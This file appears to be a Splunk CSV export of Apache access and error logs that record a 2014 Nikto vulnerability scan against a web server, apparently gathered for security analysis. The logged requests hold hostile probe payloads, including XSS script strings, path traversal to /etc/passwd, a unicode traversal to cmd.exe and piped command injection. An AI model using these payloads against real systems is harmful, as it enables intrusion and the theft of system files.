CHANGE,CODE,CONFIG,Digits,FILE,HELP,HTMLVER,"HTML_FILE",Image,ImageName,NEXTPAGE,Page,QALIAS,QNikto,Qname,"_raw","_time",action,app,az,basehref,branch,bytes,c,calbirthdays,"cart_id",cartid,cartname,category,classification,clientip,comma,command,cookie,cvsroot,date,"date_hour","date_mday","date_minute","date_month","date_second","date_wday","date_year","date_zone",day,desc,"dest_ip","dest_port",dn,etype,eventtype,file,filename,folder,foot,forum,"generator_id",head,host,hours,ident,index,key,linecount,method,module,name,next,other,pa,page,param1,passurl,person,priority,proto,protocol,punct,query,referer,"referer_domain","req_time",root,sd,setup,severity,signature,"signature_rev",sortby,source,sourcetype,"splunk_server","splunk_server_group","src_ip","src_port",status,tag,"tag::eventtype",template,timeendpos,timestartpos,uri,"uri_domain","uri_path","uri_query",user,useragent,version,view,who
,,,,,,,,,,,,,,,"[Thu May 08 15:23:52 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/ustorekeeper.pl","2014-05-08T15:23:52.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,52,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:52 2014] [error] [client 24.84.224.154] script '/var/www/cgi-bin/bb_smilies.php' not found or unable to stat","2014-05-08T15:23:52.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,52,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]__'///-/.'______",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:51 -0700] ""GET /cgi-bin/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)""","2014-05-08T15:23:51.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,51,thursday,2014,"-420",,,,,,,,"environ.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,"<script>",,,,,,"..._-_-_[//:::_-]_""_/-/.?=<>(.)</>_/.""___""-""_""/._(",,"-",,"08/May/2014:15:23:51 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/environ.pl?param1=<script>alert(document.cookie)</script>",,"/cgi-bin/environ.pl","param1=<script>alert(document.cookie)</script>","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:51 -0700] ""GET /cgi-bin/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1"" 404 316 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)""","2014-05-08T15:23:51.000-0700",,,,,,316,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,51,thursday,2014,"-420",,,,,,,,"testcgi.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?<>(.)</>_/.""___""-""_""/._(/",,"-",,"08/May/2014:15:23:51 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/testcgi.exe?<script>alert(document.cookie)</script>",,"/cgi-bin/testcgi.exe","<script>alert(document.cookie)</script>","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:51 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/environ.pl","2014-05-08T15:23:51.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,51,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:51 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/testcgi.exe","2014-05-08T15:23:51.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,51,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:49 -0700] ""GET /cgi-bin/testcgi.exe HTTP/1.1"" 404 316 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003223)""","2014-05-08T15:23:49.000-0700",,,,,,316,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,49,thursday,2014,"-420",,,,,,,,"testcgi.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:49 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/testcgi.exe",,"/cgi-bin/testcgi.exe",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003223)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:49 -0700] ""GET /cgi-bin/environ.pl HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003222)""","2014-05-08T15:23:49.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,49,thursday,2014,"-420",,,,,,,,"environ.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:49 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/environ.pl",,"/cgi-bin/environ.pl",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003222)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:49 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/testcgi.exe","2014-05-08T15:23:49.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,49,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:49 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/environ.pl","2014-05-08T15:23:49.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,49,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:48 -0700] ""GET /cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1"" 404 341 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003191)""","2014-05-08T15:23:48.000-0700",,,,,,341,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,48,thursday,2014,"-420",,,,,,,,"cmd.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/..%%../..%%..///.?/+_/.""___",,"-",,"08/May/2014:15:23:48 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir",,"/cgi-bin/..%c0%af../..%c0%af../winnt/system32/cmd.exe","/c+dir","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003191)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:48 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/..\xc0\xaf..","2014-05-08T15:23:48.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,48,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/..\\..",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/sensepost.exe?/c+dir HTTP/1.1"" 404 318 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003189)""","2014-05-08T15:23:47.000-0700",,,,,,318,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,"sensepost.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?/+_/.""___""-""_""/._(/..)_(:",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/sensepost.exe?/c+dir",,"/cgi-bin/sensepost.exe","/c+dir","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003189)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../../etc/passwd%00.html&passurl=/category/ HTTP/1.1"" 404 314 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003184)""","2014-05-08T15:23:47.000-0700",,,,,,314,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,odp,,"apexec.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,"/category/",,,,,"..._-_-_[//:::_-]_""_/-/.?=&=../../../../../../../.",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,"../../../../../../../../../../etc/passwd%00.html",45,19,"/cgi-bin/apexec.pl?etype=odp&template=../../../../../../../../../../etc/passwd%00.html&passurl=/category/",,"/cgi-bin/apexec.pl","etype=odp&template=../../../../../../../../../../etc/passwd%00.html&passurl=/category/","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003184)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/texis/junk HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003181)""","2014-05-08T15:23:47.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,junk,,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//_/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/texis/junk",,"/cgi-bin/texis/junk",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003181)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/texis.exe/junk HTTP/1.1"" 404 319 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003180)""","2014-05-08T15:23:47.000-0700",,,,,,319,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,junk,,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/./_/.""___""-""_""/._(/..)_(:)_",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/texis.exe/junk",,"/cgi-bin/texis.exe/junk",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003180)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/webnews.pl HTTP/1.1"" 404 315 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003178)""","2014-05-08T15:23:47.000-0700",,,,,,315,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,"webnews.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/webnews.pl",,"/cgi-bin/webnews.pl",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003178)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/Webnews.exe HTTP/1.1"" 404 316 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003177)""","2014-05-08T15:23:47.000-0700",,,,,,316,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,"Webnews.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/Webnews.exe",,"/cgi-bin/Webnews.exe",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003177)","HTTP/1.1",,
,,,,"../../../../../../../../../../etc/passwd",,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"" 404 310 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003176)""","2014-05-08T15:23:47.000-0700",,,,,,310,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,"r.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?=../../../../../../../../",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/r.cgi?FILE=../../../../../../../../../../etc/passwd",,"/cgi-bin/r.cgi","FILE=../../../../../../../../../../etc/passwd","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003176)","HTTP/1.1",,
,,,,"../../../../../../../../../../etc/passwd",,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:47 -0700] ""GET /cgi-bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd HTTP/1.1"" 404 318 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003175)""","2014-05-08T15:23:47.000-0700",,,,,,318,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,47,thursday,2014,"-420",,,,,,,,"r.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-//.?=../../../../../../../..",,"-",,"08/May/2014:15:23:47 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/powerup/r.cgi?FILE=../../../../../../../../../../etc/passwd",,"/cgi-bin/powerup/r.cgi","FILE=../../../../../../../../../../etc/passwd","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003175)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/sensepost.exe","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/apexec.pl","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/texis","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/texis.exe","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/webnews.pl","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/Webnews.exe","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/r.cgi","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:47 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/powerup","2014-05-08T15:23:47.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,47,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:46 -0700] ""GET /cgi-bin/VsSetCookie.exe? HTTP/1.1"" 404 320 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003169)""","2014-05-08T15:23:46.000-0700",,,,,,320,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,46,thursday,2014,"-420",,,,,,,,"VsSetCookie.exe",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?_/.""___""-""_""/._(/..)_(:)_",,"-",,"08/May/2014:15:23:46 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/VsSetCookie.exe?",,"/cgi-bin/VsSetCookie.exe",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003169)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:46 -0700] ""GET /cgi-bin/rtm.log HTTP/1.1"" 404 312 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003168)""","2014-05-08T15:23:46.000-0700",,,,,,312,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,46,thursday,2014,"-420",,,,,,,,"rtm.log",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:46 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/rtm.log",,"/cgi-bin/rtm.log",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003168)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:46 -0700] ""GET /cgi-bin/main_menu.pl HTTP/1.1"" 404 317 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003159)""","2014-05-08T15:23:46.000-0700",,,,,,317,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,46,thursday,2014,"-420",,,,,,,,"main_menu.pl",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/._/.""___""-""_""/._(/..)_(:)_(",,"-",,"08/May/2014:15:23:46 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/main_menu.pl",,"/cgi-bin/main_menu.pl",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003159)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:46 -0700] ""GET /cgi-bin/guestbook.cgi?user=cpanel&template=|/bin/cat%20/etc/passwd| HTTP/1.1"" 404 318 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003156)""","2014-05-08T15:23:46.000-0700",,,,,,318,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,46,thursday,2014,"-420",,,,,,,,"guestbook.cgi",,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/.?=&=|//%//|_/.""___""-""_""/._",,"-",,"08/May/2014:15:23:46 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/guestbook.cgi?user=cpanel&template=|/bin/cat%20/etc/passwd|",,"/cgi-bin/guestbook.cgi","user=cpanel&template=|/bin/cat%20/etc/passwd|","-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003156)","HTTP/1.1",,
,,,,,,,,,,,,,,,"24.84.224.154 - - [08/May/2014:15:23:46 -0700] ""GET /cgi-bin/gettransbitmap HTTP/1.1"" 404 319 ""-"" ""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003155)""","2014-05-08T15:23:46.000-0700",,,,,,319,,,,,,,,"24.84.224.154",,,,,,15,8,23,may,46,thursday,2014,"-420",,,,,,,,gettransbitmap,,,,,,,Network1HP,,"-",main,,1,GET,,,,,,,,,,,,,"..._-_-_[//:::_-]_""_/-/_/.""___""-""_""/._(/..)_(:)_(:",,"-",,"08/May/2014:15:23:46 -0700","cgi-bin",,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/access_log.2","access_combined",RazLT,,,,404,,,,45,19,"/cgi-bin/gettransbitmap",,"/cgi-bin/gettransbitmap",,"-","Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003155)","HTTP/1.1",,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:46 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/VsSetCookie.exe","2014-05-08T15:23:46.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,46,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
,,,,,,,,,,,,,,,"[Thu May 08 15:23:46 2014] [error] [client 24.84.224.154] script not found or unable to stat: /var/www/cgi-bin/rtm.log","2014-05-08T15:23:46.000-0700",,,,,,,,,,,,,,,,,,,,15,8,23,may,46,thursday,2014,local,,,,,,,,,,,,,,,Network1HP,,,main,,1,,,,,,,,,,,,,,"[___::_]_[]_[_...]_______:_///-/.",,,,,,,,,,,,"/home/raz/Github/2015SecAnalysis/network1/httpd/error_log.2","apache_error",RazLT,,,,,,,,26,0,,,,,,,,,
